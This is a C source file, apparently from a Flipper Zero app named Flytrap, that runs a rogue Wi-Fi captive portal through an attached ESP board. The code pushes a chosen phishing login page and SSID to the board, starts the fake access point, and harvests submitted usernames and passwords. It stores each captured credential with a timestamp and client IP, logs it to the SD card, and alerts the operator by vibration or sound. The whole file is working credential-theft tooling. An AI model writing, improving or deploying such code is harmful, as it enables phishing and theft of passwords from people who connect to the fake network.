#include "flytrap_session.h"
#include "flytrap_storage.h"
#include "flytrap_format.h"
#include "../flytrap_i.h"

// Everything here runs on the GUI thread (RX is drained from the global custom
// event handler), so app state is single-threaded — no locking needed.

// Keep a session text buffer bounded: drop the older half when it grows too big.
static void bound_buf(FuriString* s) {
    size_t sz = furi_string_size(s);
    if(sz > FLYTRAP_SESSION_BUF_MAX) {
        furi_string_right(s, sz - FLYTRAP_SESSION_BUF_MAX / 2);
    }
}

static void notify_capture(FlytrapApp* app) {
    if(app->vibro_on) notification_message(app->notifications, &sequence_single_vibro);
    if(app->sound_on) notification_message(app->notifications, &sequence_success);
}

static void store_cred(FlytrapApp* app, const char* kv) {
    // Store a structured record in the ring (browsed as list -> detail).
    FlytrapCapture* c = &app->captures[app->cap_head];
    DateTime dt;
    furi_hal_rtc_get_datetime(&dt);
    snprintf(c->when, sizeof(c->when), "%02u:%02u:%02u", dt.hour, dt.minute, dt.second);
    flytrap_kv_get_ip(kv, c->ip, sizeof(c->ip));
    strncpy(c->raw, kv, FLYTRAP_CAP_KV_SIZE - 1);
    c->raw[FLYTRAP_CAP_KV_SIZE - 1] = '\0';

    app->cap_head = (app->cap_head + 1) % FLYTRAP_CAP_SLOTS;
    app->cap_count++;

    flytrap_storage_append_log(app, "cred", kv);
    notify_capture(app);
}

static void append_raw(FlytrapApp* app, const char* line) {
    furi_string_cat_str(app->session_raw, line);
    furi_string_cat_str(app->session_raw, "\n");
    bound_buf(app->session_raw);
}

static void process_line(FlytrapApp* app, const char* line) {
    append_raw(app, line); // everything is visible in the raw console

    if(strncmp(line, "STATUS ", 7) == 0) {
        const char* tok = line + 7;
        furi_string_set(app->status, tok);
        if(strncmp(tok, "html_ok", 7) == 0 && app->pending_setap) {
            app->pending_setap = false;
            FuriString* cmd = furi_string_alloc();
            furi_string_printf(cmd, "setap %s\n", furi_string_get_cstr(app->ssid));
            flytrap_uart_tx(
                app->uart, (const uint8_t*)furi_string_get_cstr(cmd), furi_string_size(cmd));
            furi_string_free(cmd);
        } else if(strncmp(tok, "ap_ok", 5) == 0) {
            flytrap_uart_tx(app->uart, (const uint8_t*)"start\n", 6);
        } else if(strncmp(tok, "portal_up", 9) == 0) {
            app->portal_running = true;
        } else if(strncmp(tok, "stopped", 7) == 0) {
            app->portal_running = false;
        } else if(strncmp(tok, "boot", 4) == 0) {
            if(app->session_active) app->need_restart = true;
        }
    } else if(strncmp(line, "HIT", 3) == 0) {
        // may carry "mac=.." (visible in the raw console); count is enough here
        app->client_count++;
    } else if(strncmp(line, "CRED ", 5) == 0) {
        store_cred(app, line + 5);
    } else if(strncmp(line, "u: ", 3) == 0) {
        furi_string_set(app->legacy_user, line + 3);
    } else if(strncmp(line, "p: ", 3) == 0) {
        // Escape the legacy fields so a value containing &/= can't forge structure.
        FuriString* eu = furi_string_alloc();
        FuriString* ep = furi_string_alloc();
        flytrap_url_encode(furi_string_get_cstr(app->legacy_user), eu);
        flytrap_url_encode(line + 3, ep);
        FuriString* kv = furi_string_alloc();
        furi_string_printf(kv, "u=%s&p=%s", furi_string_get_cstr(eu), furi_string_get_cstr(ep));
        store_cred(app, furi_string_get_cstr(kv));
        furi_string_free(kv);
        furi_string_free(eu);
        furi_string_free(ep);
    }
}

static void feed(FlytrapApp* app, const uint8_t* buf, size_t len) {
    for(size_t i = 0; i < len; i++) {
        char c = (char)buf[i];
        if(c == '\n') {
            size_t sz = furi_string_size(app->line_acc);
            if(sz > 0 && furi_string_get_char(app->line_acc, sz - 1) == '\r') {
                furi_string_left(app->line_acc, sz - 1);
            }
            process_line(app, furi_string_get_cstr(app->line_acc));
            furi_string_reset(app->line_acc);
        } else {
            furi_string_push_back(app->line_acc, c);
            if(furi_string_size(app->line_acc) > FLYTRAP_LINE_MAX) {
                furi_string_reset(app->line_acc); // runaway guard
            }
        }
    }
}

// Read the selected portal, template {{SSID}}, and stream it as "sethtml <N>\n"
// + N raw bytes. setap fires later when the ESP acks "STATUS html_ok".
static bool send_html(FlytrapApp* app) {
    FuriString* html = furi_string_alloc();
    if(!flytrap_storage_read_file(furi_string_get_cstr(app->portal_path), html, FLYTRAP_HTML_MAX)) {
        furi_string_set(app->status, "html read err");
        furi_string_free(html);
        return false;
    }
    furi_string_replace_all(html, FLYTRAP_SSID_TOKEN, furi_string_get_cstr(app->ssid));
    size_t size = furi_string_size(html);

    FuriString* hdr = furi_string_alloc();
    furi_string_printf(hdr, "sethtml %u\n", (unsigned)size);
    flytrap_uart_tx(app->uart, (const uint8_t*)furi_string_get_cstr(hdr), furi_string_size(hdr));
    flytrap_uart_tx(app->uart, (const uint8_t*)furi_string_get_cstr(html), size);
    furi_string_free(hdr);
    furi_string_free(html);

    app->pending_setap = true;
    furi_string_set(app->status, "html sent");
    return true;
}

void flytrap_session_start(FlytrapApp* app) {
    app->cap_count = 0;
    app->cap_head = 0;
    app->client_count = 0;
    app->portal_running = false;
    app->pending_setap = false;
    app->need_restart = false;
    app->session_active = true;
    furi_string_set(app->status, "starting");
    furi_string_reset(app->line_acc);
    furi_string_reset(app->legacy_user);
    furi_string_reset(app->session_raw);

    flytrap_storage_new_log(app);

    // Discard any stale bytes the ESP sent before this session.
    uint8_t scratch[64];
    while(flytrap_uart_rx(app->uart, scratch, sizeof(scratch)) > 0) {
    }

    send_html(app);
}

void flytrap_session_stop(FlytrapApp* app) {
    flytrap_uart_tx(app->uart, (const uint8_t*)"stop\n", 5);
    app->session_active = false;
    app->portal_running = false;
    app->pending_setap = false;
    furi_string_set(app->status, "stopped");
}

void flytrap_session_rx(FlytrapApp* app) {
    uint8_t buf[128];
    size_t n;
    while((n = flytrap_uart_rx(app->uart, buf, sizeof(buf))) > 0) {
        feed(app, buf, n);
    }
    if(app->need_restart) {
        // ESP rebooted mid-session; redo the handshake (keep buffers). Only clear
        // the flag once the resend actually succeeds, so a transient SD read
        // failure re-attempts on the next RX instead of stalling the portal.
        if(send_html(app)) app->need_restart = false;
    }
}
